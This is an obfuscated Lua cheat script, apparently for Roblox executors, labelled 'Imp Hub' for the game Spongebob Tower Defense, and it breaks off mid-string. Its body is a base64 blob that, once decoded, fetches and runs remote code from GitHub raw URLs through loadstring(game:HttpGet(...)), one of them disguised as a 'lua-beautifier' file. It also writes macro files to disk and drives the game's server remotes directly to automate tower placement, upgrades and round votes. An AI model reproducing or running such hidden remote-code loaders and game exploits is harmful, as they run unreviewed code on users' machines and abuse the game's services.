-- Obfuscated By Trex - https://discord.gg/9VtMXsjmBM


local SshEhIbiNX = "YXNzZXJ0KFByb2dyZXNzLCAiWW91ciBFeGVjdXRvciBEb2VzIE5vdCBTdXBwb3J0IE9uZSBPZiBPdXIgRnVuY3R1b25zLCBQbGVhc2UgQ2hhbmdlIFRvIEEgQmV0dGVyIE9uZS4iKQoKbG9jYWwgZnVuY3Rpb24gVGhlU2NyaXB0KCkKICAgIGxvY2FsIFVJID0gUHJvZ3Jlc3MKCSAgIFVJLkxvZ2luLk9iamVjdC5WaXNpYmxlID0gZmFsc2UKCSAgIFVJLkh1Yi5PYmplY3QuVmlzaWJsZSA9IGZhbHNlCgkgICBVSS5XaW5kb3c6Q2xvc2UoKQoJICAgCgkgICBsb2NhbCBGbHVlbnQgPQogICAgbG9hZHN0cmluZygKICAgIGdhbWU6SHR0cEdldCgiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0FsYW4wOTQ3MzgzL0NvZW1zL3JlZnMvaGVhZHMvbWFpbi9sdWEtYmVhdXRpZmllci5sdWEudHh0IikKKSgpCmxvY2FsIFNhdmVNYW5hZ2VyID0KICAgIGxvYWRzdHJpbmcoZ2FtZTpIdHRwR2V0KCJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vZGF3aWQtc2NyaXB0cy9GbHVlbnQvbWFzdGVyL0FkZG9ucy9TYXZlTWFuYWdlci5sdWEiKSkoKQpsb2NhbCBJbnRlcmZhY2VNYW5hZ2VyID0KICAgIGxvYWRzdHJpbmcoCiAgICBnYW1lOkh0dHBHZXQoImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9kYXdpZC1zY3JpcHRzL0ZsdWVudC9tYXN0ZXIvQWRkb25zL0ludGVyZmFjZU1hbmFnZXIubHVhIikKKSgpCgpsb2NhbCBXaW5kb3cgPQogICAgRmx1ZW50OkNyZWF0ZVdpbmRvdygKICAgIHsKICAgICAgICBUaXRsZSA9ICJJbXAgSHViIiwKICAgICAgICBTdWJUaXRsZSA9ICJTcG9uZ2Vib2IgVG93ZXIgRGVmZW5zZSIsCiAgICAgICAgVGFiV2lkdGggPSAxMzAsCiAgICAgICAgU2l6ZSA9IFVEaW0yLmZyb21PZmZzZXQoNTAwLCA0MDApLAogICAgICAgIEFjcnlsaWMgPSB0cnVlLAogICAgICAgIFRoZW1lID0gIkltcCIsCiAgICAgICAgTWluaW1pemVLZXkgPSBFbnVtLktleUNvZGUuTGVmdENvbnRyb2wKICAgIH0KKQoKbG9jYWwgVGFicyA9IHsKICAgIExvZyA9IFdpbmRvdzpBZGRUYWIoe1RpdGxlID0gIi0gTG9nIiwgSWNvbiA9ICJzZXJ2ZXIifSksCiAgICBKb2luID0gV2luZG93OkFkZFRhYih7VGl0bGUgPSAiLSBKb2luIEdhbWUiLCBJY29uID0gInBsYXkifSksCiAgICBHYW1lID0gV2luZG93OkFkZFRhYih7VGl0bGUgPSAiLSBHYW1lcGxheSIsIEljb24gPSAicG93ZXIifSksCiAgICBNYWluID0gV2luZG93OkFkZFRhYih7VGl0bGUgPSAiLSBNYWNybyIsIEljb24gPSAiZmlsZS1jb2RlIn0pLAogICAgV2ViaG9vayA9IFdpbmRvdzpBZGRUYWIoe1RpdGxlID0gIi0gV2ViaG9vayIsIEljb24gPSAiY2FzdCJ9KSwKICAgIFN1bW1vbiA9IFdpbmRvdzpBZGRUYWIoe1RpdGxlID0gIi0gQmFubmVyIiwgSWNvbiA9ICJ0aWNrZXQifSksCiAgICBMb2JieSA9IFdpbmRvdzpBZGRUYWIoe1RpdGxlID0gIi0gTG9iYnkiLCBJY29uID0gImFybWNoYWlyIn0pLAogICAgUGxheWVyID0gV2luZG93OkFkZFRhYih7VGl0bGUgPSAiLSBQbGF5ZXIiLCBJY29uID0gInVzZXIifSksCiAgICBDcmVkaXRzID0gV2luZG93OkFkZFRhYih7VGl0bGUgPSAiLSBDcmVkaXRzIiwgSWNvbiA9ICJoYW5kIn0pLAogICAgU2V0dGluZ3MgPSBXaW5kb3c6QWRkVGFiKHtUaXRsZSA9ICItIFNldHRpbmdzIiwgSWNvbiA9ICJzZXR0aW5ncyJ9KQp9Cgpsb2NhbCBQbHIgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIKbG9jYWwgR1MgPSBnYW1lOkdldFNlcnZpY2UoIkd1aVNlcnZpY2UiKQpsb2NhbCBWSU0gPSBnYW1lOkdldFNlcnZpY2UoIlZpcnR1YWxJbnB1dE1hbmFnZXIiKQpsb2NhbCBWVSA9IGdhbWU6R2V0U2VydmljZSgiVmlydHVhbFVzZXIiKQpsb2NhbCBUUyA9IGdhbWU6R2V0U2VydmljZSgiVGVsZXBvcnRTZXJ2aWNlIikKbG9jYWwgSHR0cCA9IGdhbWU6R2V0U2VydmljZSgiSHR0cFNlcnZpY2UiKQpsb2NhbCBNYWNyb3MgPSB7fQpsb2NhbCBDdXJyZW50TWFjcm8gPSB7fQpsb2NhbCBDb21wbGV0ZWRBY3Rpb25zID0ge30KbG9jYWwgQWN0aW9uc0NvbXBsZXRlZCA9IDAKbG9jYWwgUmVjb3JkaW5nID0gZmFsc2UKbG9jYWwgUmVwbGF5aW5nID0gZmFsc2UKbG9jYWwgaG9vawpsb2NhbCBjdXJyZW50d2F2ZQpsb2NhbCBnb3R3YXZlCgpsb2NhbCBJc0pvaW5pbmdHYW1lID0gZmFsc2UKbG9jYWwgSXNKb2luaW5nQ2hhbGxlbmdlID0gZmFsc2UKCmxvY2FsIFN0YWdlcyA9IHt9CmxvY2FsIEFjdHMgPSB7IjEiLCAiMiIsICIzIiwgIjQiLCAiNSIsICI2In0KbG9jYWwgRGlmZmljdWx0aWVzID0geyJOb3JtYWwiLCAiSGFyZCIsICJOaWdodG1hcmUifQoKaWYgaXNmaWxlKCJJbXAgSHViIiAuLiAiL1Nwb25nZWJvYlREL01hY3Jvcy9TYXZlZE1hY3Jvcy5qc29uIikgdGhlbgogICAgTWFjcm9zID0gSHR0cDpKU09ORGVjb2RlKHJlYWRmaWxlKCJJbXAgSHViIiAuLiAiL1Nwb25nZWJvYlREL01hY3Jvcy9TYXZlZE1hY3Jvcy5qc29uIikpCmVuZAoKaWYgbm90IGlzZm9sZGVyKCJJbXAgSHViIikgdGhlbgogICAgbWFrZWZvbGRlcigiSW1wIEh1YiIpCmVuZAoKaWYgbm90IGlzZm9sZGVyKCJJbXAgSHViIiAuLiAiL1Nwb25nZWJvYlREIikgdGhlbgogICAgbWFrZWZvbGRlcigiSW1wIEh1YiIgLi4gIi9TcG9uZ2Vib2JURCIpCiAgICB0YXNrLndhaXQoMC41KQogICAgbWFrZWZvbGRlcigiSW1wIEh1YiIgLi4gIi9TcG9uZ2Vib2JURC9NYWNyb3MiKQogICAgdGFzay53YWl0KDAuNCkKICAgIHdyaXRlZmlsZSgiSW1wIEh1YiIgLi4gIi9TcG9uZ2Vib2JURC9NYWNyb3MvU2F2ZWRNYWNyb3MuanNvbiIsICJbXSIpCmVuZApsb2NhbCBGaWxlcyA9IE1hY3JvcyBvciB7Ik5vIFNhdmVkIE1hY3JvcyJ9Cgpsb2NhbCBmdW5jdGlvbiBTYXZlQWN0aW9uKFR5cGUsIERhdGEpCiAgICBpZiBUeXBlID09ICJQbGFjZSIgdGhlbgogICAgICAgIHRhYmxlLmluc2VydCgKICAgICAgICAgICAgQ3VycmVudE1hY3JvLAogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICB0eXBlID0gVHlwZSwKICAgICAgICAgICAgICAgIGRhdGEgPSB7CiAgICAgICAgICAgICAgICAgICAgdW5pdCA9IERhdGEudW5pdCwKICAgICAgICAgICAgICAgICAgICB3YXZlID0gRGF0YS53YXZlLAogICAgICAgICAgICAgICAgICAgIGNmcmFtZSA9IERhdGEuY2ZyYW1lLAogICAgICAgICAgICAgICAgICAgIHJlcXVpcmVkbW9uZXkgPSBEYXRhLnJlcXVpcmVkbW9uZXkKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICkKICAgIGVsc2VpZiBUeXBlID09ICJVcGdyYWRlIiB0aGVuCiAgICAgICAgdGFibGUuaW5zZXJ0KAogICAgICAgICAgICBDdXJyZW50TWFjcm8sCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIHR5cGUgPSBUeXBlLAogICAgICAgICAgICAgICAgZGF0YSA9IHsKICAgICAgICAgICAgICAgICAgICB1bml0ID0gRGF0YS51bml0LAogICAgICAgICAgICAgICAgICAgIGNmcmFtZSA9IERhdGEuY2ZyYW1lLAogICAgICAgICAgICAgICAgICAgIHVwZ3JhZGUgPSBEYXRhLnVwZ3JhZGUsCiAgICAgICAgICAgICAgICAgICAgd2F2ZSA9IERhdGEud2F2ZQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgKQogICAgZWxzZWlmIFR5cGUgPT0gIlByaW9yaXR5IiB0aGVuCiAgICAgICAgdGFibGUuaW5zZXJ0KAogICAgICAgICAgICBDdXJyZW50TWFjcm8sCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIHR5cGUgPSBUeXBlLAogICAgICAgICAgICAgICAgZGF0YSA9IHsKICAgICAgICAgICAgICAgICAgICB1bml0ID0gRGF0YS51bml0LAogICAgICAgICAgICAgICAgICAgIGNmcmFtZSA9IERhdGEuY2ZyYW1lLAogICAgICAgICAgICAgICAgICAgIHByaW9yaXR5ID0gRGF0YS5wcmlvcml0eSwKICAgICAgICAgICAgICAgICAgICB3YXZlID0gRGF0YS53YXZlCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICApCiAgICBlbHNlaWYgVHlwZSA9PSAiU2tpcCIgdGhlbgogICAgICAgIHRhYmxlLmluc2VydCgKICAgICAgICAgICAgQ3VycmVudE1hY3JvLAogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICB0eXBlID0gVHlwZSwKICAgICAgICAgICAgICAgIGRhdGEgPSB7CiAgICAgICAgICAgICAgICAgICAgd2F2ZSA9IERhdGEud2F2ZQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgKQogICAgZWxzZWlmIFR5cGUgPT0gIlN0YXJ0R2FtZSIgdGhlbgogICAgICAgIHRhYmxlLmluc2VydCgKICAgICAgICAgICAgQ3VycmVudE1hY3JvLAogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICB0eXBlID0gVHlwZSwKICAgICAgICAgICAgICAgIGRhdGEgPSB7CiAgICAgICAgICAgICAgICAgICAgd2F2ZSA9IERhdGEud2F2ZQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgKQogICAgZW5kCmVuZAoKbG9jYWwgZnVuY3Rpb24gR2V0Q29zdChVbml0KQogICAgbG9jYWwgY29zdAogICAgZm9yIGksIHYgaW4gaXBhaXJzKGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyLlBsYXllckd1aS5IVUQuQm90dG9tLkhvdGJhcjpHZXRDaGlsZHJlbigpKSBkbwogICAgICAgIGlmCiAgICAgICAgICAgIHY6RmluZEZpcnN0Q2hpbGQoIkNvbnRlbnQiKSBhbmQgdi5Db250ZW50OkZpbmRGaXJzdENoaWxkKCJUb3dlckluZm8iKSBhbmQKICAgICAgICAgICAgICAgIHYuQ29udGVudC5Ub3dlckluZm86RmluZEZpcnN0Q2hpbGQoIlZpZXdwb3J0RnJhbWUiKSBhbmQKICAgICAgICAgICAgICAgIHYuQ29udGVudC5Ub3dlckluZm8uVmlld3BvcnRGcmFtZTpGaW5kRmlyc3RDaGlsZCgiV29ybGRNb2RlbCIpIGFuZAogICAgICAgICAgICAgICAgdi5Db250ZW50LlRvd2VySW5mby5WaWV3cG9ydEZyYW1lLldvcmxkTW9kZWw6R2V0Q2hpbGRyZW4oKVsxXS5OYW1lID09IFVuaXQKICAgICAgICAgdGhlbgogICAgICAgICAgICBjb3N0ID0gdi5Db250ZW50LlRvd2VySW5mby5Db3N0LkFtb3VudC5UZXh0CiAgICAgICAgZW5kCiAgICBlbmQKICAgIHJldHVybiBjb3N0CmVuZAoKbG9jYWwgZnVuY3Rpb24gR2V0U2xvdChVbml0KQogICAgbG9jYWwgc2xvdAogICAgZm9yIGksIHYgaW4gaXBhaXJzKGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyLlBsYXllckd1aS5IVUQuQm90dG9tLkhvdGJhcjpHZXRDaGlsZHJlbigpKSBkbwogICAgICAgIGlmCiAgICAgICAgICAgIHY6RmluZEZpcnN0Q2hpbGQoIkNvbnRlbnQiKSBhbmQgdi5Db250ZW50OkZpbmRGaXJzdENoaWxkKCJUb3dlckluZm8iKSBhbmQKICAgICAgICAgICAgICAgIHYuQ29udGVudC5Ub3dlckluZm86RmluZEZpcnN0Q2hpbGQoIlZpZXdwb3J0RnJhbWUiKSBhbmQKICAgICAgICAgICAgICAgIHYuQ29udGVudC5Ub3dlckluZm8uVmlld3BvcnRGcmFtZTpGaW5kRmlyc3RDaGlsZCgiV29ybGRNb2RlbCIpIGFuZAogICAgICAgICAgICAgICAgdi5Db250ZW50LlRvd2VySW5mby5WaWV3cG9ydEZyYW1lLldvcmxkTW9kZWw6R2V0Q2hpbGRyZW4oKVsxXS5OYW1lID09IFVuaXQKICAgICAgICAgdGhlbgogICAgICAgICAgICBzbG90ID0gdi5OYW1lCiAgICAgICAgZW5kCiAgICBlbmQKICAgIHJldHVybiBzbG90CmVuZAoKbG9jYWwgZnVuY3Rpb24gR2V0TnVtQnlQcmlvcml0eShwcmlvcikKICAgIGlmIHByaW9yIHRoZW4KICAgICAgICBpZiBwcmlvciA9PSAiRmlyc3RJblJhbmdlIiB0aGVuCiAgICAgICAgICAgIHJldHVybiAxCiAgICAgICAgZWxzZWlmIHByaW9yID09ICJMYXN0SW5SYW5nZSIgdGhlbgogICAgICAgICAgICByZXR1cm4gMgogICAgICAgIGVuZAogICAgZW5kCmVuZAoKbG9jYWwgZnVuY3Rpb24gR2V0Q2xvc2VzdFVuaXRCeVBvcyhkaXN0KQogICAgbG9jYWwgbmVhcmVzdHVuaXQKICAgIGxvY2FsIG5lYXJlc3RkaXN0ID0gbWF0aC5odWdlCiAgICBmb3IgaSwgdiBpbiBpcGFpcnMod29ya3NwYWNlLkZyaWVuZGxpZXM6R2V0Q2hpbGRyZW4oKSkgZG8KICAgICAgICBsb2NhbCBPd25lcklkID0gdjpHZXRBdHRyaWJ1dGUoIk93bmVySWQiKQogICAgICAgIGlmIE93bmVySWQgYW5kIHRvc3RyaW5nKE93bmVySWQpID09IHRvc3RyaW5nKFBsci5Vc2VySWQpIHRoZW4KICAgICAgICAgICAgbG9jYWwgZGlzdGFuY2UgPSAodi5Sb290UGFydC5Qb3NpdGlvbiAtIGRpc3QpLk1hZ25pdHVkZQogICAgICAgICAgICBpZiBkaXN0YW5jZSA8IG5lYXJlc3RkaXN0IHRoZW4KICAgICAgICAgICAgICAgIG5lYXJlc3R1bml0ID0gdjpHZXRBdHRyaWJ1dGUoIklkIikKICAgICAgICAgICAgICAgIG5lYXJlc3RkaXN0ID0gZGlzdGFuY2UKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICBlbmQKICAgIHJldHVybiBuZWFyZXN0dW5pdAplbmQKCmxvY2FsIGZ1bmN0aW9uIFJlcGxheU1hY3JvKG1hY3JvKQogICAgaWYgbWFjcm8gdGhlbgogICAgICAgIGxvY2FsIEFjdGlvbnNUb0NvbXBsZXRlID0gI0h0dHA6SlNPTkRlY29kZShyZWFkZmlsZSgiSW1wIEh1YiIgLi4gIi9TcG9uZ2Vib2JURC8iIC4uIG1hY3JvKSkKICAgICAgICBmb3IgaSwgdiBpbiBpcGFpcnMoSHR0cDpKU09ORGVjb2RlKHJlYWRmaWxlKCJJbXAgSHViIiAuLiAiL1Nwb25nZWJvYlRELyIgLi4gbWFjcm8pKSkgZG8KICAgICAgICAgICAgdGFzay53YWl0KCkKICAgICAgICAgICAgZ290d2F2ZSA9CiAgICAgICAgICAgICAgICBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5QbGF5ZXJHdWkuR2FtZVVJLlRvcC5NYWluLlN0YWdlSW5mby5GcmFtZS5DdXJyZW50V2F2ZS5UZXh0OmdzdWIoCiAgICAgICAgICAgICAgICAiJUQiLAogICAgICAgICAgICAgICAgIiIKICAgICAgICAgICAgKQogICAgICAgICAgICBjdXJyZW50d2F2ZSA9IHRvbnVtYmVyKGdvdHdhdmUpCiAgICAgICAgICAgIGlmIHYudHlwZSA9PSAiUGxhY2UiIHRoZW4KICAgICAgICAgICAgICAgIGlmIGN1cnJlbnR3YXZlID49IHRvbnVtYmVyKHYuZGF0YS53YXZlKSBhbmQgbm90IENvbXBsZXRlZEFjdGlvbnNbaV0gdGhlbgogICAgICAgICAgICAgICAgICAgIGlmCiAgICAgICAgICAgICAgICAgICAgICAgIHRvbnVtYmVyKAogICAgICAgICAgICAgICAgICAgICAgICAgICAgZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIuUGxheWVyR3VpLkhVRC5Cb3R0b20uR2FtZUN1cnJlbmN5LkNvaW5zLlRpdGxlLlRleHQKICAgICAgICAgICAgICAgICAgICAgICAgKSA+PSB0b251bWJlcih2LmRhdGEucmVxdWlyZWRtb25leSkKICAgICAgICAgICAgICAgICAgICAgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBjZnJhbWVQYXJ0cyA9IHN0cmluZy5zcGxpdCh2LmRhdGEuY2ZyYW1lLCAiLCAiKQogICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBjZnJhbWUgPQogICAgICAgICAgICAgICAgICAgICAgICAgICAgQ0ZyYW1lLm5ldygKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRvbnVtYmVyKGNmcmFtZVBhcnRzWzFdKSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRvbnVtYmVyKGNmcmFtZVBhcnRzWzJdKSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRvbnVtYmVyKGNmcmFtZVBhcnRzWzNdKSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRvbnVtYmVyKGNmcmFtZVBhcnRzWzRdKSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRvbnVtYmVyKGNmcmFtZVBhcnRzWzVdKSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRvbnVtYmVyKGNmcmFtZVBhcnRzWzZdKSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRvbnVtYmVyKGNmcmFtZVBhcnRzWzddKSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRvbnVtYmVyKGNmcmFtZVBhcnRzWzhdKSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRvbnVtYmVyKGNmcmFtZVBhcnRzWzldKSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRvbnVtYmVyKGNmcmFtZVBhcnRzWzEwXSksCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB0b251bWJlcihjZnJhbWVQYXJ0c1sxMV0pLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgdG9udW1iZXIoY2ZyYW1lUGFydHNbMTJdKQogICAgICAgICAgICAgICAgICAgICAgICApCiAgICAgICAgICAgICAgICAgICAgICAgIGdhbWU6R2V0U2VydmljZSgiUmVwbGljYXRlZFN0b3JhZ2UiKTpXYWl0Rm9yQ2hpbGQoIlBhY2thZ2VzIik6V2FpdEZvckNoaWxkKCJfSW5kZXgiKTpXYWl0Rm9yQ2hpbGQoCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAic2xlaXRuaWNrX2tuaXRAMS43LjAiCiAgICAgICAgICAgICAgICAgICAgICAgICk6V2FpdEZvckNoaWxkKCJrbml0Iik6V2FpdEZvckNoaWxkKCJTZXJ2aWNlcyIpOldhaXRGb3JDaGlsZCgiVG93ZXJTZXJ2aWNlIik6V2FpdEZvckNoaWxkKCJSRiIpOldhaXRGb3JDaGlsZCgKICAgICAgICAgICAgICAgICAgICAgICAgICAgICJQbGFjZVRvd2VyIgogICAgICAgICAgICAgICAgICAgICAgICApOkludm9rZVNlcnZlcihjZnJhbWUsIHRvbnVtYmVyKEdldFNsb3Qodi5kYXRhLnVuaXQpKSkKICAgICAgICAgICAgICAgICAgICAgICAgQWN0aW9uc0NvbXBsZXRlZCA9IEFjdGlvbnNDb21wbGV0ZWQgKyAxCiAgICAgICAgICAgICAgICAgICAgICAgIENvbXBsZXRlZEFjdGlvbnNbaV0gPSB0cnVlCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZWxzZWlmIHYudHlwZSA9PSAiVXBncmFkZSIgdGhlbgogICAgICAgICAgICAgICAgaWYgY3VycmVudHdhdmUgPj0gdG9udW1iZXIodi5kYXRhLndhdmUpIGFuZCBub3QgQ29tcGxldGVkQWN0aW9uc1tpXSB0aGVuCiAgICAgICAgICAgICAgICAgICAgZm9yIGkyLCB2MiBpbiBpcGFpcnMod29ya3NwYWNlLkZyaWVuZGxpZXM6R2V0Q2hpbGRyZW4oKSkgZG8KICAgICAgICAgICAgICAgICAgICAgICAgaWYgR2V0Q2xvc2VzdFVuaXRCeVBvcyh2Mi5Sb290UGFydC5Qb3NpdGlvbikgfj0gbmlsIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIHYyOkdldEF0dHJpYnV0ZSgiVXBncmFkZSIpIDwgdi5kYXRhLnVwZ3JhZGUgYW5kIHYyLk5hbWUgPT0gdi5kYXRhLnVuaXQgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJlcGVhdAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZ2FtZTpHZXRTZXJ2aWNlKCJSZXBsaWNhdGVkU3RvcmFnZSIpOldhaXRGb3JDaGlsZCgiUGFja2FnZXMiKTpXYWl0Rm9yQ2hpbGQoIl9JbmRleCIpOldhaXRGb3JDaGlsZCgKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICJzbGVpdG5pY2tfa25pdEAxLjcuMCIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgKTpXYWl0Rm9yQ2hpbGQoImtuaXQiKTpXYWl0Rm9yQ2hpbGQoIlNlcnZpY2VzIik6V2FpdEZvckNoaWxkKCJHYW1lU2VydmljZSIpOldhaXRGb3JDaGlsZCgKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICJSRiIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgKTpXYWl0Rm9yQ2hpbGQoIlVwZ3JhZGVUb3dlciIpOkludm9rZVNlcnZlcigKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEdldENsb3Nlc3RVbml0QnlQb3ModjIuUm9vdFBhcnQuUG9zaXRpb24pCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB1bnRpbCB2MjpHZXRBdHRyaWJ1dGUoIlVwZ3JhZGUiKSA+PSB2LmRhdGEudXBncmFkZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIENvbXBsZXRlZEFjdGlvbnNbaV0gPSB0cnVlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQWN0aW9uc0NvbXBsZXRlZCA9IEFjdGlvbnNDb21wbGV0ZWQgKyAxCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZWxzZWlmIHYudHlwZSA9PSAiUHJpb3JpdHkiIHRoZW4KICAgICAgICAgICAgICAgIGlmIGN1cnJlbnR3YXZlID49IHRvbnVtYmVyKHYuZGF0YS53YXZlKSBhbmQgbm90IENvbXBsZXRlZEFjdGlvbnNbaV0gdGhlbgogICAgICAgICAgICAgICAgICAgIGZvciBpMywgdjMgaW4gaXBhaXJzKHdvcmtzcGFjZS5GcmllbmRsaWVzOkdldENoaWxkcmVuKCkpIGRvCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIEdldENsb3Nlc3RVbml0QnlQb3ModjMuUm9vdFBhcnQuUG9zaXRpb24pIH49IG5pbCBhbmQgdjMuTmFtZSA9PSB2LmRhdGEudW5pdCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiB2MzpHZXRBdHRyaWJ1dGUoIkF0dGFja01vZGUiKSB+PSB2LmRhdGEucHJpb3JpdHkgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIGFyZ3MgPSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFsxXSA9IEdldENsb3Nlc3RVbml0QnlQb3ModjMuUm9vdFBhcnQuUG9zaXRpb24pLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBbMl0gPSBHZXROdW1CeVByaW9yaXR5KHYuZGF0YS5wcmlvcml0eSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGdhbWU6R2V0U2VydmljZSgiUmVwbGljYXRlZFN0b3JhZ2UiKTpXYWl0Rm9yQ2hpbGQoIlBhY2thZ2VzIik6V2FpdEZvckNoaWxkKCJfSW5kZXgiKTpXYWl0Rm9yQ2hpbGQoCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICJzbGVpdG5pY2tfa25pdEAxLjcuMCIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICApOldhaXRGb3JDaGlsZCgia25pdCIpOldhaXRGb3JDaGlsZCgiU2VydmljZXMiKTpXYWl0Rm9yQ2hpbGQoIkdhbWVTZXJ2aWNlIik6V2FpdEZvckNoaWxkKAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAiUkYiCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgKTpXYWl0Rm9yQ2hpbGQoIkNoYW5nZVRvd2VyVGFyZ2V0TW9kZSIpOkludm9rZVNlcnZlcigKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgR2V0Q2xvc2VzdFVuaXRCeVBvcyh2My5Sb290UGFydC5Qb3NpdGlvbiksCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEdldE51bUJ5UHJpb3JpdHkodi5kYXRhLnByaW9yaXR5KQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBDb21wbGV0ZWRBY3Rpb25zW2ldID0gdHJ1ZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEFjdGlvbnNDb21wbGV0ZWQgPSBBY3Rpb25zQ29tcGxldGVkICsgMQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVsc2VpZiB2LnR5cGUgPT0gIlN0YXJ0R2FtZSIgdGhlbgogICAgICAgICAgICAgICAgaWYKICAgICAgICAgICAgICAgICAgICBjdXJyZW50d2F2ZSA9PSB0b251bWJlcih2LmRhdGEud2F2ZSkgYW5kCiAgICAgICAgICAgICAgICAgICAgICAgIGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyLlBsYXllckd1aS5HYW1lU3RhcnQuRW5hYmxlZAogICAgICAgICAgICAgICAgIHRoZW4KICAgICAgICAgICAgICAgICAgICBnYW1lOkdldFNlcnZpY2UoIlJlcGxpY2F0ZWRTdG9yYWdlIik6V2FpdEZvckNoaWxkKCJQYWNrYWdlcyIpOldhaXRGb3JDaGlsZCgiX0luZGV4Iik6V2FpdEZvckNoaWxkKAogICAgICAgICAgICAgICAgICAgICAgICAic2xlaXRuaWNrX2tuaXRAMS43LjAiCiAgICAgICAgICAgICAgICAgICAgKTpXYWl0Rm9yQ2hpbGQoImtuaXQiKTpXYWl0Rm9yQ2hpbGQoIlNlcnZpY2VzIik6V2FpdEZvckNoaWxkKCJHYW1lU2VydmljZSIpOldhaXRGb3JDaGlsZCgiUkYiKTpXYWl0Rm9yQ2hpbGQoCiAgICAgICAgICAgICAgICAgICAgICAgICJWb3RlU3RhcnRSb3VuZCIKICAgICAgICAgICAgICAgICAgICApOkludm9rZVNlcnZlcigpCiAgICAgICAgICAgICAgICAgICAgQWN0aW9uc0NvbXBsZXRlZCA9IEFjdGlvbnNDb21wbGV0ZWQgKyAxCiAgICAgICAgICAgICAgICAgICAgQ29tcGxldGVkQWN0aW9uc1tpXSA9IHRydWUKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbHNlaWYgdi50eXBlID09ICJTa2lwIiB0aGVuCiAgICAgICAgICAgICAgICBpZgogICAgICAgICAgICAgICAgICAgIGN1cnJlbnR3YXZlID09IHRvbnVtYmVyKHYuZGF0YS53YXZlKSBhbmQKICAgICAgICAgICAgICAgICAgICAgICAgZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIuUGxheWVyR3VpLlZvdGVTa2lwLkVuYWJsZW